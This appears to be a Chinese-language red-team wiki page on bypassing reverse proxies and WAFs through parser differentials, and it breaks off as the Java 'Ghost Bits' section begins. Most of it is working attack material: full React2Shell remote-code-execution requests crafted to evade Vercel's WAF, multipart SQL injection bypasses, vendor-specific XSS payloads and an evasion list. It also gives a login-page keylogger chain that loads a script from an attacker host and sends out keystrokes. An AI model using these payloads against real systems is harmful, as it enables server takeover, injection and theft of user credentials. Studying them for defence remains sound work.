---
attack_surface:
  - 协议解析差异
  - 缓存/代理逻辑
impact:
  - 权限提升
  - 远程代码执行
  - 完整性破坏
  - 信息泄露
risk_level: 高
prerequisites:
  - HTTP/1.1 协议细节（头部、multipart、路径规范化）
  - 反向代理 / WAF 架构基础
  - 常见后端框架解析行为（NodeJS、Flask、Spring、PHP-FPM）
related_techniques:
  - http-request-smuggling
  - cache-poisoning
  - file-upload
  - xss
  - h2c-smuggling
  - unicode-normalization
  - ghost-bits-cast-attack
  - deserialization
  - crlf-injection
difficulty: 中级
tools:
  - nowafpls
  - fireprox
  - ip-rotate
  - shadowclone
---

# Proxy & WAF Protections Bypass — 代理与 WAF 防护绕过

> 关联文档：[HTTP Request Smuggling](../HTTP%20Request%20Smuggling/README.md) · [Web Cache Poisoning & Cache Deception](../Cache%20Poisoning%26Cache%20Deception/README.md) · [File Upload — WAF Bypass](../../Files/File%20Upload/WAF%20Bypass.md) · [XSS](../../User%20input/Reflected%20Values/XSS/README.md) · [CRLF 注入](../../User%20input/Reflected%20Values/CRLF/README.md) · [Deserialization](../../User%20input/Structured%20objects/Deserialization/README.md) · [基于 Multipart/form-data 换行符差异的通用 WAF 绕过技术](基于%20Multipartform-data%20换行符差异的通用%20WAF%20绕过技术.md)

---

# 0x01 原理与分类

## 1.1 核心原理：解析器语法不等价

WAF 与反向代理的防护逻辑依赖对 HTTP 请求的解析结果。当 WAF/代理层与后端服务器对同一请求的解析存在差异时（grammar un-equivalence，语法不等价），WAF 检查的是一个"无害的解释"，而后端重建出真实的恶意载荷。差异来源主要有四类：

- **路径规范化差异**：代理层在匹配 ACL 规则前执行路径规范化，但后端使用不同的规范化逻辑（移除代理层不会移除的字符）。
- **头部解析差异**：畸形头部（如 Line Folding 续行）在一端被忽略、在另一端被合并进头部值。
- **请求体解析差异**：multipart 边界符、charset、重复参数等语法歧义；或请求体超过 WAF 检查阈值导致完全不检查。
- **编码归一化差异**：WAF 对用户输入执行深度解码（如 URL 解码 10 次）或 Unicode 归一化，而应用不执行同等级处理，攻击者可在深度编码层隐藏有效 payload。
- **字符收窄差异**：Java 后端将 16 位 `char` 窄化为 8 位 `byte` 时静默丢弃高位——WAF 看到无害的 Unicode 字符，后端在字节层重建出原始 ASCII 攻击字节（Ghost Bits / Cast Attack，见 # 0x07）。

> **关键点**：绕过成功率取决于**代理层与后端解析器的实现差异**，而非 WAF 规则库本身的缺陷。红队需主动探测目标技术栈的解析特性，而非依赖通用 payload 库。

## 1.2 技术分类矩阵

| 类别 | 章节 | 根因 | 典型目标 |
|------|------|------|----------|
| 路径操作绕过 | # 0x03 | 路径规范化不一致 | Nginx ACL、ModSecurity、PHP-FPM |
| 请求解析绕过 | # 0x04 | 头部/请求体解析不一致 | AWS WAF、各厂商请求体阈值、CDN 静态资源策略 |
| Multipart 解析差异 | # 0x05 | 表单语法不等价 | Vercel WAF、阿里云 WAF、ModSecurity |
| 内容混淆绕过 | # 0x06 | 编码归一化层级差异 | Akamai、Imperva、Cloudflare、正则规则库 |
| 字符收窄绕过 | # 0x07 | char→byte 高位丢失（Ghost Bits） | Java 生态：Tomcat、Spring、Jetty、Fastjson、Jackson、BCEL、HttpClient |
| 协议层与基础设施 | # 0x08 | 协议转换差异 / 防护边界外 | H2C、IP 信誉与限速 |

## 1.3 知识路径

```plaintext
Proxy & WAF Protections Bypass（本文档）
  ├── 前置知识：HTTP 协议基础、反向代理架构
  ├── 前置知识：Java char/byte 编码模型（# 0x07 Ghost Bits）
  ├── 下一步：HTTP Request Smuggling（同为解析差异，作用于请求边界）
  ├── 下一步：Web Cache Poisoning（静态资源绕过 + 缓存投毒链）
  └── 相关：File Upload WAF Bypass、XSS 过滤器绕过、CRLF 注入、反序列化
```

---

# 0x02 检测与前置条件

## 2.1 解析器差异探测

在尝试绕过之前，先测绘目标的解析差异：

1. **路径探测**：对受保护端点（如 `/admin`）发送变体 `/admin%A0/`、`/admin%09/`、`/admin;/`、`/admin%2e`，对比 WAF 拦截响应（403）与后端响应（200/302），判定哪类字符穿透了前端规范化。
2. **请求体阈值探测**：发送逐步增大的 POST 请求体（8 KB → 64 KB → 128 KB 以上），在临界位置放置触发 WAF 规则的测试字符串（如 `' OR '1'='1`），观察拦截行为消失的阈值点。
3. **multipart 回显端点**：寻找或自建能回显后端解析结果的端点（如文件上传回显、调试接口），保持后端 payload 不变、仅变异传输语法，diff WAF 决策与后端解析结果。
4. **静态资源检查强度**：对 `.js`/`.css` 路径发送含恶意特征的 `User-Agent`，对比动态端点的拦截差异。

## 2.2 WAF 平台指纹

- 响应头与错误页指纹（`Server`、拦截页样式、特定状态码）。
- IP 信誉行为：被标记的 IP 可能触发路由变更，导致绕过技术失效——优先使用未标记的干净 IP 测试。
- 协议版本：HTTP/2 对头部严格标准化，多数头部类绕过仅适用于 HTTP/1.1。

---

# 0x03 路径操作类绕过

## 3.1 Nginx ACL 规则绕过（路径规范化差异）

技术研究来源：[Exploiting HTTP Parsers Inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)（原文已迁移至 blog.bugport.net）。

典型 Nginx ACL 配置：

```plaintext
location = /admin {
    deny all;
}

location = /admin/ {
    deny all;
}
```

为防止绕过，Nginx 在检查路径前会执行路径规范化。然而，如果后端服务器执行**不同的规范化**（移除 Nginx 不会移除的字符），就可以绕过此防御：Nginx 认为路径不等于 `/admin` 放行请求，而后端将该字符 trim 掉之后恰好命中受保护端点。

## 3.2 后端框架差异化绕过矩阵

### 3.2.1 NodeJS - Express

| Nginx 版本 | Node.js 绕过字符 |
| ---------- | ---------------- |
| 1.22.0     | `\xA0`           |
| 1.21.6     | `\xA0`           |
| 1.20.2     | `\xA0`, `\x09`, `\x0C` |
| 1.18.0     | `\xA0`, `\x09`, `\x0C` |
| 1.16.1     | `\xA0`, `\x09`, `\x0C` |

利用条件：Express 框架未执行额外的路径规范化。

### 3.2.2 Flask

| Nginx 版本 | Flask 绕过字符 |
| ---------- | -------------- |
| 1.22.0     | `\x85`, `\xA0` |
| 1.21.6     | `\x85`, `\xA0` |
| 1.20.2     | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0     | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1     | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

利用条件：Werkzeug 解析器接受非常规空白字符（高版本 Nginx 字符集扩大）。

### 3.2.3 Spring Boot

| Nginx 版本 | Spring Boot 绕过字符 |
| ---------- | -------------------- |
| 1.22.0     | `;`                  |
| 1.21.6     | `;`                  |
| 1.20.2     | `\x09`, `;`          |
| 1.18.0     | `\x09`, `;`          |
| 1.16.1     | `\x09`, `;`          |

利用条件：Tomcat 路径分割逻辑接受 matrix parameter 分隔符 `;`。

### 3.2.4 PHP-FPM

Nginx FPM 配置：

```plaintext
location = /admin.php {
    deny all;
}

location ~ \.php$ {
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```

Nginx 配置为阻止访问 `/admin.php`，但可以通过访问 `/admin.php/index.php` 绕过：精确匹配 `location = /admin.php` 未命中，请求落入 `location ~ \.php$` 被转发给 PHP-FPM，而后端 PHP-FPM 将 `admin.php` 识别为脚本路径执行。

**防御方案**（来自源文档 How to prevent）：精确路径匹配（`=`）存在系统性绕过风险，应强制使用正则匹配：

```plaintext
location ~* ^/admin {
    deny all;
}
```

## 3.3 ModSecurity 路径混淆（CVE-2024-1019）

来源：[ModSecurity: Path Confusion and really easy bypass on v2 and v3](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)。

- **ModSecurity v3（< 3.0.12）**：`REQUEST_FILENAME` 变量实现不当——它在提取路径**之前先执行了 URL 解码**。因此请求 `http://example.com/foo%3f';alert(1);foo=` 中，`%3f` 被解码为 `?`，ModSecurity 认为路径只是 `/foo`（其后内容被当作 query string 排除在规则检查之外），但服务器实际接收的路径是 `/foo%3f';alert(1);foo=`。变量 `REQUEST_BASENAME` 和 `PATH_INFO` 同样受此 bug 影响。该行为属于**未文档化的隐式 URL 解码**。
- **修复状态**：v3 分支已在 3.0.12 修复，分配编号 **CVE-2024-1019**；**v2 分支至今未修复**。
- **ModSecurity v2**：未正确处理 URL 编码的 `.`（如 `%2e`），可绕过阻止访问备份文件扩展名（如 `.bak`）的防护：`https://example.com/backup%2ebak` → 规则匹配 `.bak` 失败，但后端视为 `/backup.bak`。
- **影响面**：OWASP Core Rule Set 在 Generic、PHP、XSS、LFI、RFI、SQLi、Java、Protocol Violation、Protocol Enforcement 等规则集中广泛使用 `REQUEST_FILENAME`，该变量失效意味着整个规则集对路径中的 payload 完全失明。

攻击链：`构造畸形路径` → `WAF 误判路径` → `后端执行原始路径` → `绕过访问控制 / 注入`。

---

# 0x04 请求解析类绕过

## 4.1 AWS WAF 畸形头部（Line Folding）

通过构造畸形 HTTP 头部结构，利用 AWS WAF 与后端服务器的头部解析差异（来源同 rafa 研究，**AWS 已修复此问题**，历史部署仍可能存在）：

```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```

- **AWS WAF 行为**：不理解 `\t` 开头的续行是 `X-Query` 头部值的一部分，按无效头部忽略。
- **NodeJS 后端行为**：将 `\t` 续行合并进 `X-Query` 的值，完整 SQL 注入 `' or '1'='1' --` 被执行。

原理：Node.js、Flask 等服务器存在 **Line Folding**（行折叠）行为——用 `\x09`（tab）和 `\x20`（空格）将长头部值拆分为多行。例如头部 `1337: Value\r\n\t1337` 会被解释为 `1337: Value\t1337`。

> **限制**：仅适用于 **HTTP/1.1**（HTTP/2 头部严格标准化）；优先测试 `\t`、`\r`、`\n` 在头部值中的续行特性。

## 4.2 请求体大小限制绕过

WAF 通常只检查一定长度以内的请求体；超过阈值的 POST/PUT/PATCH 请求不会被检查，恶意 payload 直接到达后端。

| WAF 平台 | 最大检查长度 | 超限行为 |
|----------|--------------|----------|
| AWS WAF — ALB / AppSync | 8 KB | 超限不检查 |
| AWS WAF — CloudFront / API Gateway / Cognito / App Runner / Verified Access | 64 KB | 超限不检查 |
| Azure WAF — CRS 3.1 及以下 | 128 KB | 可关闭请求体检查，超限消息不做漏洞检查 |
| Azure WAF — CRS 3.2 及以上 | 可配置（可禁用最大请求体限制） | 预防模式：记录并阻断；检测模式：检查至上限、忽略其余、`Content-Length` 超限时记录日志 |
| Akamai | 8 KB（默认） | 可通过添加 Advanced Metadata 提升至 128 KB |
| Cloudflare | 128 KB | 超限不检查 |

攻击链：`确认目标 WAF 平台与阈值` → `发送超大请求体` → `将恶意 payload 置于阈值之后` → `WAF 跳过检查`。工具见 # 0x0A 的 nowafpls（Burp 插件，自动向请求填充垃圾数据撑大长度）。

## 4.3 静态资源检查缺口（.js GET）

部分 CDN/WAF 对静态资源（如以 `.js` 结尾的路径）的 GET 请求实施弱检查甚至不做内容检查，仅应用全局规则（IP 限速、信誉库），同时静态扩展名通常被自动缓存。这可以被滥用于投递或"播种"恶意变体，影响后续的 HTML 响应。

实战用法：

1. 在对 `.js` 路径的 GET 请求中，将 payload 放在不受信任的头部（如 `User-Agent: <script>alert(1)</script>`）以避开内容检查，随后立即请求主 HTML 页面影响缓存变体。
2. 使用干净 IP：一旦 IP 被标记，路由变化会使该技术不可靠。
3. 在 Burp Repeater 中使用 "Send group in parallel"（单数据包方式）让 `.js` 与 HTML 两个请求经同一前端路径竞速通过。

该技术本质上是头部反射缓存投毒的前置步骤，完整的投毒链与缓存键分析见 [Web Cache Poisoning & Cache Deception](../Cache%20Poisoning%26Cache%20Deception/README.md)。实战案例：[0-Click Account Takeover（SSO 误配置 + self-XSS + 缓存投毒链，5 位数赏金）](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)。

---

# 0x05 Multipart 解析差异绕过

## 5.1 语法不等价原理

针对解析器驱动漏洞的应急 WAF 规则（如 React2Shell 期间各厂商部署的规则）会**自行解析 `multipart/form-data`**，然后只扫描重建出的字段。这种做法很脆弱：如果 WAF 与后端没有实现**相同的语法**，WAF 检查的是一个无害的解释，而后端重建出真实的 payload。应将其视为**语法不等价**问题，而非纯粹的签名绕过。

这在 **React2Shell**（CVE-2025-55182，React Server Functions 预认证 RCE，影响 Next.js 15.x–16.0.6 及 react-router、Waku、@parcel/rsc、@vitejs/plugin-rsc、rwsdk）等利用链中尤为关键：恶意服务端对象图可以保持不变，只变异 **HTTP 传输语法**，直到 WAF 与源站产生分歧。这些歧义与 [HTTP Request Smuggling](../HTTP%20Request%20Smuggling/README.md) 的解析差异高度重叠。

## 5.2 高价值解析差异检查点

- **顶层 `Content-Type` 解析**：重复 `boundary=` 参数、引号有无、空格、转义、RFC 5987 参数、多个 `Content-Type` 头、大小写敏感性、非法/非 UTF-8 字节。
- **multipart 框架**：首个边界符前/后的垃圾数据、`\r\n` vs `\n`、超大请求体处理、重复字段名、畸形结束标记（如 `--boundary-- ` 带尾空格）。
- **部件级头部**：重复 `Content-Type`、`Content-Disposition` 怪癖（`filename`、`filename*=`）、部件级 charset（如 `utf16le` / `ucs2`）、重复子头部、`Content-Transfer-Encoding`。

## 5.3 可利用模式

- **重复参数优先级错配**：WAF 取最后一个 `boundary=` 而后端取第一个 → WAF 解析出空请求体，后端解析攻击者控制的部件。
- **解析器错误即放行（fail-open）**：畸形头部或非法字节使 WAF 解析器报错，而请求仍被转发 → 检查被事实性关闭。
- **部件级 charset 解码缺口**：后端在 multipart 部件内接受 `Content-Type: text/plain; charset=utf16le`（或 `ucs2`），而 WAF 扫描原始字节 → `:constructor` 等被封堵标记可藏在编码后的请求体中。`busboy`（Node.js 主流 multipart 解析器）的源码确认其将 `utf16le` / `utf-16le` / `ucs2` / `ucs-2` 全部映射到 UTF-16 解码器（`decoders.utf16le`，经 `ucs2Slice` 解码），见 [busboy lib/utils.js](https://github.com/mscdex/busboy/blob/6b3dcf69d38c1a8d53a0b3e4c88ba296f6c91525/lib/utils.js#L403-L406)。
- **重复 multipart 子头部**：同一部件内重复 `Content-Type` 可制造第二级优先级错配——WAF 看到 `charset=utf8`，后端接受第一个 `charset=utf16le`。
- **边界终止符怪癖**：WAF 接受 `--boundary-- `（带尾空格）为结束标记，而后端因尾空格拒绝 → WAF 过早停止扫描，后端继续解析后续部件。

## 5.4 实战案例：Vercel React2Shell WAF 五连绕过

来源：[$170k in Bypasses: The Vercel React2Shell Challenge — Hacktron](https://www.hacktron.ai/blog/react2shell-vercel-waf-bypass)。Vercel 为 React2Shell 悬赏每个独立 WAF 绕过 5 万美元，最终 116 名研究者参与、验证 20 种独立绕过、发放超 100 万美元赏金（Hacktron 团队获 17 万美元）。以下为该团队黑盒发现的 5 个绕过，逐一对应 §5.3 的模式。WAF 行为为黑盒推断，且在对抗期间快速演化。

### 5.4.1 WAF 行为观测（初始形态）

1. 解析表单请求体
2. 忽略边界符外的垃圾数据
3. 对表单值执行 JSON 反转义
4. 任何值中出现 `:constructor` 则阻断

### 5.4.2 Bypass 1：重复 boundary 参数

```http
POST / HTTP/2
Host: nextjs-cve-hackerone.vercel.app
Next-Action: x
Content-Type: multipart/form-data; boundary=y; boundary=x
Content-Length: [...auto]

--y
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('echo $VERCEL_PLATFORM_PROTECTION').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});","_formData":{"get":"$1:constructor:constructor"}}}
--y
Content-Disposition: form-data; name="1"

"$@0"
--y--
```

WAF 认为边界符是 `x` 从而忽略整个请求体；后端认为是 `y` 并正常解析。payload 原型来自 @maple3142，修改了 JS 代码使命令输出回显在响应头（利用 `NEXT_REDIRECT` digest 通道）。

### 5.4.3 Bypass 2：头部非 UTF-8 字节（fail-open）

WAF 在此期间升级为"解析失败即放行"。在任意头部放入非 UTF-8 字节（如 `boundary="y"; a="b<0x88>"`，最初用 `y<0x88>` 作边界符时发现），WAF 解析器直接失败并将请求原样转发，不做任何清洗。请求体与 Bypass 1 相同。

### 5.4.4 Bypass 3：UTF-16LE charset

在 multipart 部件内添加 `Content-Type: text/plain; charset=utf16le`，busboy 会用 `ucs2Slice` 按 UTF-16 解码该部件的值，而 WAF 扫描原始字节看不到 `:constructor`：

```http
POST / HTTP/2
Host: nextjs-cve-hackerone.vercel.app
Next-Action: x
Content-Type: multipart/form-data; boundary="y"
Content-Length: [...auto]

--y
Content-Disposition: form-data; name="0"
Content-Type: text/plain; charset=utf16le

{<0x00>"<0x00>t<0x00>h<0x00>e<0x00>n<0x00>"<0x00> [...UTF-16LE 编码的 React2Shell payload]
--y
Content-Disposition: form-data; name="1"

"$@0"
--y--
```

注：部件级 `charset=utf16`（不带 le）时后端返回 `undefined`，由此顺藤摸瓜发现 busboy 的 charset 支持表（另存在一个"编码而非解码"的 buggy base64 模式）。

### 5.4.5 Bypass 4：部件内重复 Content-Type

WAF 再次进化：检测重复 `boundary=`、多个顶层 `Content-Type`、解析失败即阻断、非 utf8 charset 即阻断、表单值 JSON 反转义两次、封堵 `"_response":` 与 `:constructor`。绕过方式——在同一部件内放两个 `Content-Type`：

```http
--y
Content-Disposition: form-data; name="0"
Content-Type: text/plain; charset=utf16le
Content-Type: text/plain; charset=utf8

<UTF-16LE 编码的 payload，同 5.4.4>
```

WAF 看到 `charset=utf8` 放行；busboy 使用第一个（`charset=utf16le`）解码。

### 5.4.6 Bypass 5：结束边界符尾空格

WAF 接受 `--y-- `（带尾空格）作为结束标记，后端（busboy）将其视为垃圾数据：

```http
POST / HTTP/2
Host: nextjs-cve-hackerone.vercel.app
Content-Type: multipart/form-data; boundary="y"
Next-Action: x
Content-Length: [...auto]

--y-- 
--y
Content-Disposition: form-data; name="foo"

1
--y
Content-Disposition: form-data; name="0"

<React2Shell payload，同 5.4.2>
--y
Content-Disposition: form-data; name="1"

"$@0"
--y--
```

请求体开头的 `--y-- ` 让 WAF 认为表单已结束，其后内容全部被当作边界外垃圾忽略；后端尚未开始解析，将第一行视为垃圾后继续正常处理后续部件。

### 5.4.7 WAF 最终形态（防御参考）

五连绕过之后，Vercel 放弃逐条修补解析差异，转向消除差异本身：

1. 检测 `Content-Type` 中重复 `boundary=`
2. 检测多个 `Content-Type` 头
3. 从**原始请求体**中移除所有 `<0x00>` 字节
4. 对**原始请求体**执行两次 JSON 反转义
5. 在**原始请求体**（而非解析后的字段）上封堵 `"_response"\s*:` 与 `:constructor`

这彻底消除了 WAF 与后端之间的 HTTP 解析差异，代价是性能损耗与潜在误报。披露后数周内该 WAF 拦截了超过 600 万次利用尝试。

## 5.5 CRLF/LF 换行符差异（跨 WAF 通用）

RFC 7578 要求 multipart 使用 CRLF（`\r\n`）作为行分隔符；多数 WAF 弱化该检查，把单独 `\n` 也当作有效分隔符，而后端（Java/Tomcat、PHP、NodeJS）严格只认 `\r\n`。将目标参数值末尾的 `\r\n` 替换为 `\n`，边界符即被后端吞进参数值，而 WAF 误认为新参数起点：

```http
POST /search HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJhvWUjzh80leEROu

------WebKitFormBoundaryJhvWUjzh80leEROu
Content-Disposition: form-data; name="keyword"

1'/*\n
------WebKitFormBoundaryJhvWUjzh80leEROu
Content-Disposition: form-data; name="xx"

*/or 1=1--\r\n
------WebKitFormBoundaryJhvWUjzh80leEROu--
```

- WAF 视角：`keyword = "1'/*"`、`xx = "*/or 1=1--"` → 无风险
- 后端接收：`keyword = "1'/*\n------WebKitFormBoundary...*/or 1=1--"` → 完整 SQL 注入

文件上传场景同样适用：将 `Content-Disposition` 行的 `\r\n` 改为 `\n`，后端把 `\n------WebKitFormBoundary...` 吞入文件名，扩展名从 `.png` 变为 `.jspx` 绕过白名单——更完整的文件上传混淆手法见 [File Upload — WAF Bypass](../../Files/File%20Upload/WAF%20Bypass.md)。该技术的完整矩阵（含阿里云 WAF / ZW WAF 实测数据、sqlmap tamper 脚本、混淆参数生成器）见同目录补充文档 [基于 Multipart/form-data 换行符差异的通用 WAF 绕过技术](基于%20Multipartform-data%20换行符差异的通用%20WAF%20绕过技术.md)。

## 5.6 测试工作流

1. 找到或自建能展示**后端解析器**如何重建每个 multipart 字段的端点。
2. 保持**后端 payload** 不变，只变异**传输语法**。
3. 在 fuzz 重复参数、重复头部、畸形字节、部件 charset、结束边界符语法的同时，diff WAF 决策与后端解析结果。
4. 将"解析错误 ⇒ 放行"视为严重发现；先用无害标记字符串验证，再重放真实利用 payload。

---

# 0x06 内容混淆类绕过

## 6.1 通用混淆

```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```

## 6.2 Unicode 兼容性

后端若在输入清洗**之后**执行 Unicode 兼容性归一化，兼容字符可绕过 WAF 并按预期 payload 执行。Unicode 归一化有四种标准形式：NFC（规范组合）、NFD（规范分解）、NFKC（兼容组合）、NFKD（兼容分解）；其中 NFKC/NFKD 执行**兼容性**转换，是绕过利用的重点（研究来源：[WAF Bypassing with Unicode Compatibility — jlajara](https://jlajara.gitlab.io/Bypass_WAF_Unicode)，兼容字符查询表：[compart.com](https://www.compart.com/en/unicode)）。

验证归一化行为的 Python 片段：

```python
import unicodedata
string = "𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃"
print('NFC: '  + unicodedata.normalize('NFC',  string))  # 𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃
print('NFD: '  + unicodedata.normalize('NFD',  string))  # 𝕃ⅇ𝙤𝓃ⅈ𝔰𝔥𝙖𝓃
print('NFKC: ' + unicodedata.normalize('NFKC', string))  # Leonishan
print('NFKD: ' + unicodedata.normalize('NFKD', string))  # Leonishan
```

典型漏洞形态：Flask 应用在 `waf(name)` 检查通过后才执行 `unicodedata.normalize('NFKD', name)`，WAF 黑名单中的 `<`、`>`、`=` 等字符可用兼容等价物绕过：

```bash
# 在 NFKD 归一化算法下，左侧字符转换为右侧的 XSS payload
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  --> ＜img src=p onerror='prompt(1)'>
```

针对 JavaScript/CSS 上下文，优先测试全角符号（`＜`、`⁼`、`＇`）与组合字符。

## 6.3 上下文感知 WAF 编码绕过

来源：[Exploring Javascript events & Bypassing WAFs via character normalization — 0x999](https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization)。

核心思路：滥用 WAF 自身的输入归一化。研究发现 **Akamai 会将用户输入 URL 解码 10 次**，因此 `<input/%2525252525252525253e/onfocus` 会被 Akamai 看作 `<input/>/onfocus`——标签已闭合，WAF 认为无害放行；但只要应用不同时解码 10 次，受害者端实际得到 `<input/%25252525252525253e/onfocus`，**仍然是有效的 XSS**。这使攻击者可以把 payload 藏在 WAF 会解码而受害者不会解码的编码层中。该手法不限于 URL 编码，同样适用于 Unicode、十六进制、八进制等编码。

各厂商实测绕过 payload：

- Akamai：`akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
- Imperva：`imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
- AWS/Cloudfront：`docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
- Cloudflare：`cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`

研究还测绘了各 WAF 实际归一化的编码种类（测试在各厂商主站上进行，自定义配置下结果可能不同）：

| WAF | 多次 URL 解码 | 命名实体 `&lt;` | 数值实体 `&#x3c;` | 十六进制 `\x3c` | Unicode `\u003c` | `\u{3c}` | `%u003c` |
|-----|---------------|-----------------|--------------------|-----------------|------------------|----------|----------|
| Cloudflare | 是（2 次） | 是 | 是 | 是 | 是 | 否 | 是 |
| CloudFront/AWS | 是（2 次） | 是 | 是 | 是 | 是 | 否 | 是 |
| F5 | 是（2 次） | 是 | 否 | 是 | 否 | 否 | 否 |
| Barracuda | 是（2 次） | 是 | 是 | 是 | 是 | 否 | 是 |
| Fortiweb | 是（64 次） | 是 | 是 | 是 | 是 | 是 | 是 |
| Sucuri | 是（2 次） | 否 | 否 | 否 | 否 | 否 | 否 |

> **注意**：并非表中所有 WAF 都能用同一手法绕过——它们往往还检查其他模式（如 `anyevent=[a-z]`），需按目标定制。

另一个上下文误用案例：Akamai 允许在 `/*` 与 `*/` 之间放置任意内容（推测因其尝试按 JS/SQL 注释解析）。因此 SQL 注入 `/*'or sleep(5)-- -*/` 不会被拦截——`/*` 是注入的起始字符串，而 `*/` 被注释掉。实测封装形式如 `?author=/*' OR 1=1-- -*%2f`。这类上下文问题还可用于**滥用 WAF 预期之外的其他漏洞类型**（例如用同一缺口打 XSS 而非 SQLi）。

## 6.4 内联 JavaScript 首语句检查缺口

部分内联检查规则集只解析事件处理器中的**第一条 JavaScript 语句**。以括号包裹的无害表达式加分号作为前缀（例如 `onfocus="(history.length);payload"`），分号后的恶意代码可绕过检查，浏览器仍会完整执行。

完整攻击链（来源：[hackcommander 案例研究](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)，目标为企业 SSO 登录页，`service` 参数反射进 `<a id="forgot_btn">` 的 `href` 属性）：

1. **注入处理器**：`onclick="print(1)"` 被拦截，但将 payload 拆成至少两条语句、且**第一条语句使用括号**，第二条语句即可注入原本被 WAF 封锁的 JS 代码：`onfocus="(history.length);malicious_code_here"`。
2. **免点击触发**：浏览器会自动聚焦 `id` 与 URL 片段匹配的元素，在利用 URL 后追加 `#forgot_btn` 使锚点在页面加载时聚焦，handler 无需用户点击即执行。
3. **精简内联桩**：目标站点已加载 jQuery，handler 只需通过 `$.getScript(...)` 引导加载攻击者服务器上的完整 keylogger。
4. **无引号构造字符串**：单引号被 URL 编码、转义双引号会破坏属性解析，因此用 `String.fromCharCode` 生成所有字符串。

辅助转换函数：

```javascript
function toCharCodes(str){
  return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```

最终属性形态：

```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```

外联脚本挂钩 `document.onkeypress` 缓冲击键，每秒通过 `new Image().src = collaborator_url + keys` 外发。该 XSS 只对未认证用户触发，因此攻击目标就是登录表单本身——受害者在登录页输入的凭据被直接记录。案例的完整分析见 [XSS — Attribute-only login XSS behind WAFs](../../User%20input/Reflected%20Values/XSS/README.md)。

## 6.5 正则表达式绕过矩阵

绕过防火墙正则过滤的通用技术：大小写交替、插入换行、编码 payload。资源：[PayloadsAllTheThings — Filter Bypass and Exotic Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads)、[OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)。以下示例来自 [allypetitt 的 WAF 绕过文章](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2)：

```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```

---

# 0x07 字符收窄类绕过（Ghost Bits / Cast Attack）

## 7.1 原理：Java char→byte 高位丢失

来源：Black Hat Asia 2026 演讲 *Cast Attack: A New Threat Posed by Ghost Bits in Java*（[幻灯片 PDF](https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf)，演讲者 Xinyu Bai (@b1u3r)、Zhihui Chen (@1ue)，贡献者 Zongzheng Zheng）。静态分析在 GitHub 上发现 **8000+ 处**高危收窄模式。

